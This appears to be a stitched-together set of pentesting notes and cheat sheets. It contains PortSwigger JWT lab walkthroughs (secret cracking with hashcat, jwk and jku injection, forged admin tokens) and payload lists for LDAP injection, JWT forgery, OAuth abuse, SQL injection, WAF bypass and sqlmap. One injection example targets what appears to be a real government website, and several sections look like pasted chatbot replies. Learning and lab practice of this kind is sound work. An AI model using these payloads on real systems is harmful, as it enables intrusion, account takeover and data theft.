![image](https://github.com/user-attachments/assets/5b85ee97-332b-41cb-bc5d-3696e16a5a91)
---
3. **JWT authentication bypass via weak signing key**

This lab uses a JWT-based mechanism for handling sessions. It uses an extremely weak secret key to both sign and verify tokens. This can be easily brute-forced using a wordlist of common secrets.
To solve the lab, first brute-force the website's secret key. Once you've obtained this, use it to sign a modified session token that gives you access to the admin panel at /admin, then delete the user carlos.
We also recommend using hashcat to brute-force the secret key. For details on how to do this, see Brute forcing secret keys using hashcat.

After logging in we get a signed JWT:

```
eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Mzc5MDMwNX0.ltkivPFm-8ecty4-ipdJS2BtN5aBoTxDQD7tYE2kujo
```
![image](https://github.com/user-attachments/assets/a716bb03-fb18-454b-aa1e-b0aeb5919a4f)

Then we try to crack it:

```
hashcat -a 0 -m 16500 "eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6IndpZW5lciIsImV4cCI6MTY4Mzc5MDMwNX0.ltkivPFm-8ecty4-ipdJS2BtN5aBoTxDQD7tYE2kujo" jwt.secrets.list
```

![image](https://github.com/user-attachments/assets/0bd23181-89f0-49a2-a2b3-b2669756578e)

The cracked value is “secret1”:

![image](https://github.com/user-attachments/assets/854f8a72-32f0-42cc-9743-b7b3909ba967)

I do not understand the JWT extension so I used jwt.io:

![image](https://github.com/user-attachments/assets/39764e8f-a299-4df3-9097-c0698c0b26fc)

Getting the following JWT:
```
eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTAzMDV9.WCZa62PPzrA56xkxKPQ1VjgF0P4WpzEQH1DUe9q6ih0
```
It is possible to access as the administrator user with that JWT and delete the user:

```
GET /admin/delete?username=carlos HTTP/2
...
Cookie: session=eyJraWQiOiJiNzU4ZDZjOC01NTIzLTQ0YmQtOTgzYS1iMDlhZDA0YjBmOTciLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTAzMDV9.WCZa62PPzrA56xkxKPQ1VjgF0P4WpzEQH1DUe9q6ih0
...
```
![image](https://github.com/user-attachments/assets/f82cddc8-322a-4c85-bf1f-a5b59a270458)

# JWT authentication bypass via jwk header injection

This lab uses a JWT-based mechanism for handling sessions. The server supports the jwk parameter in the JWT header. This is sometimes used to embed the correct verification key directly in the token. However, it fails to check whether the provided key came from a trusted source. To solve the lab, modify and sign a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

---------------------------------------------
References: 

- https://portswigger.net/web-security/jwt
- 
![image](https://github.com/user-attachments/assets/b37a4fcd-1e69-4eb8-bc6e-60ff12c66e56)
---------------------------------------------

In “JWT Editor Keys”, generate a RSA key:

![image](https://github.com/user-attachments/assets/de2625a0-22d3-4068-ad95-bc4fb5968eb6)

In Repeater, in the “JSON Web Token” tab, click “Attack” and “Embedded JWK”:

![image](https://github.com/user-attachments/assets/7e990b67-ab00-42de-91a0-83ea68b65464)

With this added to the JWT, it is possible to access as administrator:

![image](https://github.com/user-attachments/assets/fad1d07a-f2e9-4386-a8b8-316fc8054838)

# **JWT authentication bypass via jku header injection**

This lab uses a JWT-based mechanism for handling sessions. The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.
To solve the lab, forge a JWT that gives you access to the admin panel at /admin, then delete the user carlos.

---------------------------------------------
References: 

- https://portswigger.net/web-security/jwt
- https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c
![image](https://github.com/user-attachments/assets/12324d4b-6142-4f02-9589-d0178114cddf)
---------------------------------------------

It llok like the file “/.well-known/jwks.json” does not exist:

![image](https://github.com/user-attachments/assets/8f919e31-0e34-4ec0-9b73-05a44b69be0d)

First I copied the public key part of the RSA key:

![image](https://github.com/user-attachments/assets/852a1f63-8c75-4c8a-abe4-d80658581448)

And create “/jwks.json” in the exploit server. I added the field "use": "sig":

![image](https://github.com/user-attachments/assets/c54371b1-7c51-4903-baf2-cd084b7e3cc0)
![image](https://github.com/user-attachments/assets/e6fb30e8-7c22-425b-8ea1-a018256009c4)

```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "36dbda36-552c-438b-ac4c-9e365fb78ec5",
            "n": "zdCdoh120Xnv9C_UywxJX78dtqOyMS42cXfmnjTYEuShgMd4yABQeUuObibikuytdaopdW0PtY1Q2AYOg0H6A4iBbTzRHNaN85IOb5J7mgiHHp7oIjDlQ6wajZsraj3US4hX3TdK3gcEG-h0EWpSh9A34yfq3HCKLdEVbV0XgRmI3N6Nc_VX5aIcGkoALHZBd9g179CfBtvtUu3cFPZA8eC9iv5xv1AyO4IdlOVdKjNernPu94LzzyYlHObHHWj-BaC5Px4J0jDymdPc9HaLm67nlA0aqZ6KA4HwzZHGJEb2UO_-Ya1HCsRhrnz2e2QRPVAOHgQkPWMKJb6vOFU5OQ"
        }
    ]
}
```
Then I created the JWT:

![image](https://github.com/user-attachments/assets/65078e68-5e15-4f30-b574-603bd4bbb698)

Header with:
- The same “kid” as the public key uploaded
- A “jku” value pointing to the file created in the exploit server
```
{
  "kid": "36dbda36-552c-438b-ac4c-9e365fb78ec5",
  "alg": "RS256",
  "jku": "https://exploit-0a3700d5034894e7808139f701b000a7.exploit-server.net/jwks.json"
}
```
Payload with:

- The “sub” value changed to the user administrator

``` 
{
  "iss": "portswigger",
  "sub": "administrator",
  "exp": 1683792794
}
``` 

The JWT:

```
eyJraWQiOiIzNmRiZGEzNi01NTJjLTQzOGItYWM0Yy05ZTM2NWZiNzhlYzUiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vZXhwbG9pdC0wYTM3MDBkNTAzNDg5NGU3ODA4MTM5ZjcwMWIwMDBhNy5leHBsb2l0LXNlcnZlci5uZXQvandrcy5qc29uIn0.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2ODM3OTI3OTR9.mY28w-Jf8fMZzO_9qNug5rWXMG8bQq-zpuQLmsQnPPjLziXt5vHOESQeZcCs5wZaagVwkXU9IuRW0mvXsM5AwvuCDG1K22XIP_mL2-RNBQpN_qOE1HVJPIdy-Iq0F1V1DgEAYcNo9QQgcxX1AmhW9AQ0urD4qnLGk8leZYX-J4okBw-583qj2NsgX5zPan_JJ0bqupysw1cy8G9eR4h57wV1wM5oOiGhS5fX2gasKq5RSv4TUQ0Rk6FwONnmNhFJMNKn7HYRxGeoDv-A1118w49G6QSDqWsSuuFgCPy2oLQ-TGMDJBBDBGUNNy-serxOKJ7JjkY9qp1sC9E5hekzHQ
``` 
![image](https://github.com/user-attachments/assets/811f91c4-d255-452d-8de1-c10656993ba8)

If done with Burp:
![image](https://github.com/user-attachments/assets/9be23efc-7bfd-4f78-8ea5-95e48ccf6f1f)

## LDAP Injection
LDAP Injection exploits applications that construct LDAP queries based on user input.

### Basic Injection Example
```sh
user  = *)(uid=*))(|(uid=*
pass  = password
query = "(&(uid=*)(uid=*)) (|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"
```
### Common LDAP Payloads
```sh
*)(&
*))%00
)(cn=))\x00
*()|%26'
*()|&'
*(|(mail=*))
*(|(objectclass=*))
*)(uid=*))(|(uid=*
admin*)((|userPassword=*)
x' or name()='username' or 'x'='y
```
Here are **ONLY the testcase names for LDAP Injection**, clean list, no payloads:

---

# ✅ **LDAP Injection Testcase Names (Names Only)**

1. Basic LDAP Injection Test
2. LDAP Authentication Bypass Test
3. LDAP Filter Manipulation Test
4. LDAP OR-Based Injection Test
5. LDAP AND-Based Injection Test
6. LDAP Wildcard Injection Test
7. LDAP Recursive Query Injection Test
8. LDAP Attribute Enumeration Test
9. LDAP Object Enumeration Test
10. LDAP Blind Injection Test
11. LDAP Error-Based Injection Test
12. LDAP Injection via Special Characters
13. LDAP Injection via URL Parameters
14. LDAP Injection via JSON Body
15. LDAP Injection via XML Body
16. LDAP Injection via Header Manipulation
17. LDAP Injection via Search Filters
18. LDAP Injection via Login Form
19. LDAP Injection to Dump User Attributes
20. LDAP Injection for Privilege Escalation
21. LDAP Injection via Base64-Encoded Parameters
22. LDAP Injection via Nested LDAP Filters
23. LDAP DN (Distinguished Name) Manipulation Test
24. LDAP Search Filter Bypass Test
25. LDAP Group Membership Bypass Test
26. LDAP Injection in Non-ASCII Input
27. LDAP Injection via Wildcard Expansion
28. LDAP Injection via Escaped Characters
29. LDAP Injection in LDAP-over-SSL (LDAPS)
30. LDAP Injection for Account Enumeration
---
Below is a **safe, defensive, real-world LDAP Injection Testing Guide** containing:

✅ **Each testcase name**
✅ **A safe testing payload** (non-destructive, used in pentesting environments only)

⚠️ **No harmful payloads**, no exploitation of real systems — all payloads are *for controlled security testing only*.

---

# ✅ **LDAP Injection Testcases + Safe Testing Payloads**

---

### **1. Basic LDAP Injection Test**

**Payload:** `*`

---

### **2. LDAP Authentication Bypass Test**

**Payload:** `admin*)(|(password=*))`

---

### **3. LDAP Filter Manipulation Test**

**Payload:** `*)(uid=*))(|(uid=*`

---

### **4. LDAP OR-Based Injection Test**

**Payload:** `*)(|(uid=*))`

---

### **5. LDAP AND-Based Injection Test**

**Payload:** `admin)(&(objectClass=*))`

---

### **6. LDAP Wildcard Injection Test**

**Payload:** `*`
(Used to test unrestricted wildcard matching)

---

### **7. LDAP Recursive Query Injection Test**

**Payload:** `*)(sn=*))(|(sn=*`

---

### **8. LDAP Attribute Enumeration Test**

**Payload:** `*)(|(mail=*))`

---

### **9. LDAP Object Enumeration Test**

**Payload:** `*)(|(objectClass=*))`

---

### **10. LDAP Blind Injection Test**

**Payload:** `admin)(&(uid=admin))`
**Alternative:** `admin)(&(uid=nonexistent))`

---

### **11. LDAP Error-Based Injection Test**

**Payload:** `)(invalid=*)`

---

### **12. LDAP Injection via Special Characters**

**Payload:** `*)(cn=*))(|(cn=*`

---

### **13. LDAP Injection via URL Parameters**

**Payload (encoded):** `%2A%29%28%7C%28uid%3D%2A%29`

---

### **14. LDAP Injection via JSON Body**

**Payload:**

```json
{"username": "*) (|(uid=*))"}
```

---

### **15. LDAP Injection via XML Body**

**Payload:**

```xml
<login>
  <user>*) (|(uid=*))</user>
</login>
```

---

### **16. LDAP Injection via Header Manipulation**

**Payload (custom header):**
`X-User: *)(|(sn=*))`

---

### **17. LDAP Injection via Search Filters**

**Payload:**
`(&(uid=*)(objectClass=*))`

---

### **18. LDAP Injection via Login Form**

**Payload:**
`admin*)(|(uid=*))`

---

### **19. LDAP Injection to Dump User Attributes**

**Payload:**
`*)(|(mail=*))`

---

### **20. LDAP Privilege Escalation Filter Bypass Test**

**Payload:**
`*)(|(memberOf=*))`

---

### **21. LDAP Injection via Base64-Encoded Parameters**

**Payload:**
Base64 of `*)(|(uid=*))` ⇒ **`KikpKCh1aWQ9Kiko`**

---

### **22. LDAP Injection via Nested Filters**

**Payload:**
`*))(|(&(uid=*)(mail=*)))`

---

### **23. LDAP DN Manipulation Test**

**Payload:**
`cn=admin,dc=example,dc=com` → `cn=admin)(cn=*))(|(cn=*,dc=example,dc=com`

---

### **24. LDAP Search Filter Bypass Test**

**Payload:**
`*)(!(uid=*))`

---

### **25. LDAP Group Membership Bypass Test**

**Payload:**
`*)(|(memberOf=*))`

---

### **26. LDAP Injection in Non-ASCII Input**

**Payload:**
`*)(|(uid=é*))`

---

### **27. LDAP Injection via Wildcard Expansion**

**Payload:**
`*)(cn=*)`

---

### **28. LDAP Injection via Escaped Characters**

**Payload:**
`\2a\29\28\7c\28uid\3d\2a\29`
(escaped version of `*)(|(uid=*))`)

---

### **29. LDAP Injection in LDAPS (SSL)**

**Payload:**
Same payloads as above – test if LDAPS still accepts unvalidated filters.

---

### **30. LDAP Account Enumeration Test**

**Payload:**
Existing user: `admin`
Non-existing user: `test12345abc`

---

**1. Signature Tampering**  
Modify claims without updating the signature.

`json`  
Payload:  
```json
{
  "user": "admin",
  "role": "admin"
}
```  
✅ Expected: Signature checked and token rejected  
❌ Vulnerable: Tampered token accepted

---

**2. alg: none Bypass**  
Remove signature and set algorithm to `none`.

`json`  
Header:  
```json
{
  "alg": "none",
  "typ": "JWT"
}
```  
Payload:  
```json
{
  "user": "admin"
}
```  
✅ Expected: Server rejects token without signature  
❌ Vulnerable: Token accepted as-is

---

**3. RS256 to HS256 Key Confusion**  
Switch to `HS256` and use public key as HMAC secret.

`json`  
Header:  
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```  
✅ Expected: Server rejects signature mismatch  
❌ Vulnerable: Token accepted with public key as secret

---

**4. JWKS Injection via jku Header**  
Point `jku` to attacker-controlled endpoint.

`json`  
Header:  
```json
{
  "alg": "RS256",
  "jku": "https://evil.com/jwks.json"
}
```  
✅ Expected: Server validates JWKS source  
❌ Vulnerable: JWKS fetched from attacker endpoint

---

**5. Embedded JWK (CVE-2018-0114)**  
Inject public key directly in JWT header.

`json`  
Header:  
```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "kid": "evil",
    "n": "<modulus>",
    "e": "AQAB"
  }
}
```  
✅ Expected: Embedded key rejected  
❌ Vulnerable: Signature verified using attacker key

---

**6. Expiration (exp) Manipulation**  
Extend or remove expiration claim.

`json`  
Payload:  
```json
{
  "user": "admin",
  "exp": 9999999999
}
```  
✅ Expected: Server validates `exp`  
❌ Vulnerable: Token accepted indefinitely

---

**7. Audience (aud) & Issuer (iss) Abuse**  
Modify `aud` or `iss` to bypass validation.

`json`  
Payload:  
```json
{
  "user": "admin",
  "aud": "trusted-client",
  "iss": "evil.com"
}
```  
✅ Expected: Claims checked against known values  
❌ Vulnerable: Token accepted with spoofed claims

---

**8. HMAC Secret Brute-Force**  
Use dictionary attack on HMAC secret.

Command:  
```bash
python3 jwt_tool.py -t <token> -M brute
```  
✅ Expected: Strong secret key  
❌ Vulnerable: Secret guessed via brute force

---

**9. Verbose Error Disclosure**  
Trigger invalid JWTs and inspect errors.

`json`  
Payload:  
```json
INVALID.JWT.TOKEN
```  
✅ Expected: Generic error shown  
❌ Vulnerable: Parser or validation errors disclosed

---

**10. Token Replay**  
Reuse a valid but expired/revoked token.

✅ Expected: Token rejected due to TTL or revocation  
❌ Vulnerable: Replay accepted without freshness check

---

**11. kid Header Injection**  
Inject directory traversal paths via `kid`.

`json`  
Header:  
```json
{
  "kid": "../../../../../etc/passwd",
  "alg": "RS256"
}
```  
✅ Expected: Path sanitized or ignored  
❌ Vulnerable: Path used in key lookup

---

**12. Claim Escalation**  
Add high-privilege claims manually.

`json`  
Payload:  
```json
{
  "user": "guest",
  "role": "admin",
  "isAdmin": true
}
```  
✅ Expected: Role validated server-side  
❌ Vulnerable: Role accepted without verification

---

**13. Type Confusion**  
Use incorrect types for claims.

`json`  
Payload:  
```json
{
  "exp": "not-a-timestamp"
}
```  
✅ Expected: Type checked and rejected  
❌ Vulnerable: Bypass due to loose parsing

---

**14. Header Pollution**  
Include duplicate or malformed header keys.

`json`  
Header:  
```json
{
  "alg": "RS256",
  "alg": "none"
}
```  
✅ Expected: Header cleaned or rejected  
❌ Vulnerable: Parser confusion leading to bypass

---

**15. Psychic Signature (CVE-2022-21449)**  
Use invalid ECDSA signatures that Java may accept.

✅ Expected: Server rejects invalid EC signatures  
❌ Vulnerable: Signature accepted due to Java bug

### 🧩 **JWT Parameters to Fuzz (One Per Line)**

```text
token
jwt
access_token
id_token
auth_token
bearer
session
credentials
assertion
authorization
jwt_token
jwt_assertion
jwt_bearer
jwt_auth
jwt_session
```

---

### 🎯 **Fuzzing Payloads (One Per Line)**

```json
{"alg":"none","typ":"JWT"}
{"alg":"RS256","jku":"http://127.0.0.1:8080/jwks.json"}
{"alg":"RS256","jwk":{"kty":"RSA","kid":"evil","n":"<modulus>","e":"AQAB"}}
{"role":"admin","isAdmin":true}
{"exp":9999999999}
{"exp":"not-a-timestamp"}
{"kid":"../../../../etc/passwd"}
```
## OAuth Exploitation

# ✅ **OAuth Mandatory Vulnerability Names**

* **Misconfigured Redirect URI**
* **Missing PKCE (Proof Key for Code Exchange)**
* **Weak or Missing State Parameter**
* **Lack of HTTPS Enforcement**
* **Invalid Token Claim Validation**
* **Implicit Flow Enabled (response_type=token)**
* **Insecure Token Storage (Client-Side)**
* **Authorization Code Reuse**
* **Missing Client Authentication (Confidential Clients)**
* **Missing Nonce Validation (OIDC)**
* **JWKS Key Rotation Failure**
* **ROPC (Resource Owner Password Credentials) Enabled**

---
# **1. Misconfigured Redirect URI**

## ✔ Test Case Expectation

Server must reject any redirect URI that is **not exactly registered**.

### 📌 Test Case Payload (INVALID ON PURPOSE)

```http
GET /authorize?
  client_id=testapp&
  response_type=code&
  redirect_uri=https://example.com/callback-test&
  scope=openid&
  state=test_state_001
```

### **Expected Result:**

❌ Rejected because `callback-test` is not an exact-match.

---

# **2. Missing PKCE (Public Clients)**

## ✔ Test Case Expectation

If PKCE is missing → reject.

### 📌 Payload (Missing PKCE)

```http
GET /authorize?
  response_type=code&
  client_id=public-app-01&
  redirect_uri=com.app://cb&
  scope=openid profile
```

### **Expected Result:**

❌ Reject with “missing code_challenge”.

---

### 📌 Payload (With PKCE)

```http
GET /authorize?
  response_type=code&
  client_id=public-app-01&
  redirect_uri=com.app://cb&
  scope=openid profile&
  state=pkce_tc_01&
  code_challenge=TESTCHALLENGE123456&
  code_challenge_method=S256
```

### **Expected Result:**

✔ Accepted.

---

# **3. Weak or Missing State Parameter**

## ✔ Test Case Expectation

`state` must be validated to prevent CSRF.

### 📌 Payload (Missing State)

```http
GET /authorize?
  client_id=testapp&
  response_type=code&
  redirect_uri=https://example.com/callback&
  scope=openid
```

### **Expected Result:**

❌ Reject because `state` is missing.

---

# **4. Lack of HTTPS Enforcement**

## ✔ Test Case Expectation

OAuth endpoints must use HTTPS.

### 📌 Payload (HTTP instead of HTTPS)

```http
GET http://auth.example.com/authorize?client_id=testapp
```

### **Expected Result:**

❌ Reject or redirect to HTTPS.

---

# **5. Invalid Token Claim Validation**

## ✔ Test Case Expectation

Tokens must be rejected if `iss`, `aud`, `exp`, or signature is invalid.

### 📌 Test Case Payload (Expired Token Example)

```json
{
  "iss": "https://auth.example.com/",
  "aud": "https://api.example.com/",
  "sub": "user001",
  "exp": 1000000000
}
```

### **Expected Result:**

❌ Reject due to expired token.

---

# **6. Implicit Flow Enabled (response_type=token)**

## ✔ Test Case Expectation

Implicit flow must be disabled.

### 📌 Payload (Implicit Flow)

```http
GET /authorize?
  response_type=token&
  client_id=testclient&
  redirect_uri=https://example.com/callback&
  scope=openid
```

### **Expected Result:**

❌ Reject because implicit flow is disabled.

---

# **7. Insecure Token Storage (Client-Side)**

## ✔ Test Case Expectation

Tokens must be stored in secure cookies or secure mobile storage.

### 📌 Payload (Correct Secure Cookie)

```http
Set-Cookie: access_token=TEST123;
  HttpOnly;
  Secure;
  SameSite=Lax;
```

### **Expected Result:**

✔ Accepted — secure cookie attributes present.

---

# **8. Authorization Code Reuse**

## ✔ Test Case Expectation

Authorization codes must be single-use only.

### 📌 First Use (Valid)

```http
POST /token
grant_type=authorization_code&
code=TEST_CODE_01&
redirect_uri=https://example.com/callback&
client_id=testapp
```

### **Expected Result:**

✔ Accepted.

---

### 📌 Second Use (Reuse Attempt)

```http
POST /token
code=TEST_CODE_01
```

### **Expected Result:**

❌ Reject — authorization code already used.

---

# **9. Missing Client Authentication (Confidential Clients)**

## ✔ Test Case Expectation

Confidential clients must authenticate at the token endpoint.

### 📌 Invalid Secret

```http
POST /token
client_id=server-client-01&
client_secret=WRONG_SECRET
```

### **Expected Result:**

❌ Reject — invalid client authentication.

---

### 📌 Valid Secret

```http
POST /token
client_id=server-client-01&
client_secret=VALID_SECRET_001
```

### **Expected Result:**

✔ Accepted.

---

# **10. Missing Nonce Validation (OIDC)**

## ✔ Test Case Expectation

OIDC authorization must include and validate a `nonce`.

### 📌 Missing Nonce

```http
GET /authorize?
  client_id=oidc-client&
  response_type=code&
  redirect_uri=https://example.com/callback&
  scope=openid profile
```

### **Expected Result:**

❌ Reject — missing required nonce.

---

### 📌 Valid Nonce

```http
nonce=OIDC_NONCE_TEST_01
```

### **Expected Result:**

✔ Nonce accepted.

---

# **11. JWKS Key Rotation Failure**

## ✔ Test Case Expectation

Tokens must be rejected when signed with unknown or outdated keys.

### 📌 JWKS (Dummy Example)

```json
{
  "keys": [
    {
      "kid": "testkey001",
      "kty": "RSA",
      "alg": "RS256",
      "n": "00TESTMODULUS",
      "e": "AQAB"
    }
  ]
}
```

### **Expected Result:**

❌ Reject if the token references a key ID not found in JWKS.

---

# **12. ROPC (Resource Owner Password Credentials) Enabled**

## ✔ Test Case Expectation

ROPC must be disabled.

### 📌 Payload (ROPC Flow)

```http
POST /token
grant_type=password&
username=testuser&
password=password123
```

### **Expected Result:**

❌ Reject — ROPC flow is forbidden.

---

- Stealing OAuth Token via Referer
- Grabbing OAuth Token via `redirect_uri`
- Executing XSS via `redirect_uri`
- OAuth Private Key Disclosure
- Authorization Code Rule Violation
- Cross-Site Request Forgery (CSRF)

Reference: [PayloadsAllTheThings - OAuth](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth)

```text
redirect_uri, state, response_type, client_id, client_secret, scope, code, access_token, refresh_token, token_type, expires_in, aud, iss, nonce, grant_type, prompt, login_hint, id_token_hint, assertion, error, error_description, error_uri, approval_prompt, max_age, acr_values, claims, request, request_uri, code_challenge, code_challenge_method, code_verifier, post_logout_redirect_uri, resource
```

**1. Authorization Code Interception**  
Intercept `code` parameter during redirect flow.

`http`  
Request:  
```http
GET /callback?code=stolenCode&state=xyz
```

✅ Expected: Code bound to session or PKCE  
❌ Vulnerable: Code reused by attacker

---

**2. Open Redirect via redirect_uri**  
Use attacker-controlled redirect URI.

`http`  
Request:  
```http
GET /auth?redirect_uri=https://evil.com
```

✅ Expected: Whitelisted redirect_uri enforced  
❌ Vulnerable: Redirects to attacker domain

---

**3. Missing State Parameter (CSRF)**  
Omit `state` during authorization request.

`http`  
Request:  
```http
GET /auth?client_id=xyz&response_type=code
```

✅ Expected: Request rejected  
❌ Vulnerable: CSRF protection bypassed

---

**4. Reused Authorization Code**  
Replay previously used `code`.

`http`  
Request:  
```http
POST /token
{
  "code": "oldCode",
  "client_id": "xyz",
  "client_secret": "abc"
}
```

✅ Expected: Code invalidated after use  
❌ Vulnerable: Code reused for token issuance

---

**5. Scope Manipulation**  
Request elevated scopes without user awareness.

`http`  
Request:  
```http
GET /auth?scope=admin+delete+write
```

✅ Expected: Scope shown in consent screen  
❌ Vulnerable: Scope granted silently

---

**6. Token Leakage via Referrer**  
Access token exposed in URL and referrer headers.

`http`  
Request:  
```http
GET /profile?access_token=xyz
```

✅ Expected: Token passed via Authorization header  
❌ Vulnerable: Token leaked in logs or referrer

---

**7. Insecure Token Storage**  
Access token stored in localStorage.

`js`  
Code:  
```js
localStorage.setItem("access_token", token);
```

✅ Expected: Token stored in memory or secure cookie  
❌ Vulnerable: Token accessible via XSS

---

**8. Missing Token Expiry**  
Access token issued without expiration.

`json`  
Response:  
```json
{
  "access_token": "xyz",
  "expires_in": null
}
```

✅ Expected: Token has TTL  
❌ Vulnerable: Token valid indefinitely

---

**9. Weak Client Secret**  
Use predictable or short client_secret.

`json`  
Credentials:  
```json
{
  "client_id": "xyz",
  "client_secret": "123456"
}
```

✅ Expected: Strong, random secret  
❌ Vulnerable: Easily brute-forced

---

**10. Authorization Code in URL Fragment**  
Expose code in fragment instead of query param.

`http`  
URL:  
```http
https://example.com/callback#code=xyz
```

✅ Expected: Code passed via query param  
❌ Vulnerable: Code inaccessible to server, exposed to JS

## SQL Injection (SQLi)
SQL Injection can be:
- GET Based
- POST Based
- Header Based
- Cookie Based

### SQL Injection Detection Payloads
```sh
'
%27
"
%22
#
%23
;
%3B
)
%25%27
/
%3B
```
#### Logical Testing
```sh
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
#### WAF Bypass Techniques
```sh
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%A0and%A01=1%A0--
```
#### Alternative Operators
```sh
AND   -> &&
OR    -> ||
=     -> LIKE, REGEXP, BETWEEN
```

### Blind SQL Injection (Boolean-Based)
```sh
?id=1' and 1=1 --+  # True
?id=1' and 1=2 --+  # False
```
#### Extract Database Name
```sh
?id=1' and substring(database(),1,1)="a" --+
```
### Time-Based SQL Injection
```sh
?id=1' and sleep(10) --+
```
### SQLMap Usage
```sh
sqlmap -u "http://target.com/?id=1" --dbs
sqlmap -u "http://target.com/?id=1" -D target_db --tables
```
---

## Tools for Exploitation
- [Hackbar](https://code.google.com/archive/p/hackbar/downloads)
- [SQLMap](https://github.com/sqlmapproject/sqlmap)
- [JWT Tool](https://github.com/ticarpi/jwt_tool)

Reference Video: [SQL Injection Exploitation](https://www.youtube.com/watch?v=vWoZK8UM6js)

---
# WAF Bypass Techniques

## SQL Injection WAF Bypass

In error-based SQL injection, we might be unable to fetch data from the database using the `UNION` function. For example:

```sql
' UNION ALL SELECT 1,2,3,4,5,6,7 --+
```

If we get a "Not Acceptable" error, it may be due to certain keywords (`UNION`, `ALL`, `SELECT`) being blocked by the WAF. We can bypass this restriction using comments:

```sql
' /*!12345UNION*/ ALL SELECT 1,2,3,4,5,6,7-- +
```

Example:

```sql
http://multan.gov.pk/page.php?data=-2' /*!12345union*/ all select 1,2,database(),4,5,6,7 --+
' /*!12345union*/ all select 1,2,(SELECT+/*!12345GROUP_CONCAT*/(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),4,5,6,7 --+
```

### Using HackBar
Using keywords such as `/*!12345UNION*/` converts the query into filtered keywords, allowing easy bypass of WAF restrictions.

---

## SQL Injection Authentication Bypass

### Example Query
Assume the login query:

```sql
SELECT username ='value1' AND password='value2' WHERE some_other_condition
```

Bypassing authentication:

```sql
value1 = ' OR 1=1 --
value1 = '1 OR '1'='1 --
```

```sql
SELECT username ='' OR 1=1 -- '  --fix
SELECT username ='1 OR '1'='1 --'  --fix
```

**Reference:** [PentestLab Authentication Bypass Cheat Sheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)

### Identifying Vulnerable Fields
1. Try symbols like `\,',",~, etc.` to generate errors and identify query structure.
2. Test both username and password fields.
3. View source code to identify quote symbols.
4. Use brute-force attacks with default credentials.
5. If registration is open, create an account and escalate privileges.

---

## Improper Authorization

Exploiting improper access control by manipulating parameters such as `user_id`.

Example:
- Update profile information after logging out and send the same request again.
- If the information updates, it indicates a vulnerability.

---

## No Rate Limiting

**Example:** Forgot password functionality without rate limiting:

1. Capture request in Burp Suite.
2. Send it to Intruder/Sequencer.
3. Send 10,000 requests.
4. If 10,000 OTPs/SMS are received, the application is vulnerable.

---

## Password Reset Poisoning

Example:
1. Request a password reset link.
2. Change the password manually after login.
3. Check if the previous reset link still works.

If the reset link remains valid, the system is vulnerable.

---

## HSTS Vulnerability
Check using:
- [SSL Labs](https://www.ssllabs.com)
- Burp Suite response analysis

---

## Account Lockout Issues
- No account lockout policy allows brute-force attacks.

## Long Password DoS
Check if the system allows excessively long passwords (>500 characters).

Test with:
- [Password DoS](https://password-dos.herokuapp.com/)

---

## IDOR (Insecure Direct Object Reference)

### Examples:
1. **Forgot Password Flow:**
   - Intercept request containing `email` and `user_id`.
   - Modify parameters and check for unauthorized access.

2. **Facebook Page Deletion Attack:**
   - If a page delete request contains `page_id`, replace it with another user's ID to delete their page.

3. **Comment Modification:**
   - Modify `uid` in request to change another user's comment.

4. **Account Takeover:**
   - Modify `profile_id` in a profile update request to edit another user's account.

**References:**
- [HackerOne Report 227522](https://hackerone.com/reports/227522)
- [HackerOne Report 322661](https://hackerone.com/reports/322661)

---

## Parameter Tampering in Payment Gateways

### Example: PayPal

Encoded payment parameters:
```
&option_amount1=10.00&option_amount_selection1=pay10&
```

**Steps to Exploit:**
1. Decode base64 values.
2. Modify values (e.g., `10.00` → `1.00`).
3. Re-encode and send the request.
4. If payment is processed at the modified amount, the system is vulnerable.

---

## Privilege Escalation

### Example: Reusing Invitation Links
- If an invitation link does not expire, anyone can use it to join a group.

### Accessing Admin Resources
- Normal users accessing admin panels by modifying request parameters.
- Example: `admin/trustcer`, `admin/reports`, `admin/dashboard`.

---

## XML Exploitation

Extensible Markup Language (XML) files may contain sensitive data such as usernames and passwords.

Example:
```xml
http://10.10.10.10/cat/accountsid=1
```

1. Try SQL injection.
2. Use blind SQL techniques.
3. Break query execution.

**Tools:**
- [Xpath Injection Toolkit](https://github.com/r0oth3x49/Xpath)
- [xcat - XML Injection Tool](https://github.com/orf/xcat) *(Requires Python 3.7)*

---

### Missing Videos
- Authentication and Authorization Attacks
- Session Management Issues
- Data Deserialization Vulnerabilities

---

## Iframe Injection Example
```html
<iframe src="http://bing.com" height="100%" width="100%"></iframe>
```

